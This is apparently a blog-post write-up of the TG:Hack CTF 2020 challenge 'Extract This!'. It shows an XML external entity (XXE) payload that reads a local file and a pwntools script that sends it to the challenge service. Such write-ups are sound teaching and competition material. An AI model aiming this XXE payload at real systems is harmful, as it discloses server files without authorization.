---
layout: post
title: TG:Hack CTF 2020 - Extract This!
---

> One of our agents managed to install a service on MOTHER's network. We can use it to extract secrets, but she didn't tell me how! Can you figure it out?
>
> nc extract.tghack.no 6000

## Analysis

Target service requires us to provide XML document.

{% highlight shell_session %}
$ nc extract.tghack.no 6000
Connecting to the service

Welcome to this absolutely not suspicious XML element extractor!


Please enter your XML here:
{% endhighlight %}

Simple XXE vulnerabilty that can be exploited here by sending following payload:

{% highlight shell_session %}
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [
      <!ENTITY xxe SYSTEM "file:///flag.txt">
      ] >
<site>
    <vuln>&xxe;</vuln>
</site>
{% endhighlight %}

## Full exploit 

{% highlight python %}
#!/usr/bin/env python3

from pwn import *

io = start()
io.recvuntil("Please enter your XML here:\n")

payload = (
"""
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [
      <!ENTITY xxe SYSTEM "file:///flag.txt">
      ] >
<site>
    <vuln>&xxe;</vuln>
</site>
"""
).replace("\n", "")
io.sendline(payload)

io.interactive()
{% endhighlight %}

[repo]: https://github.com/r0ck3tz/ctfs/tree/master/2020/tghack/extract-this
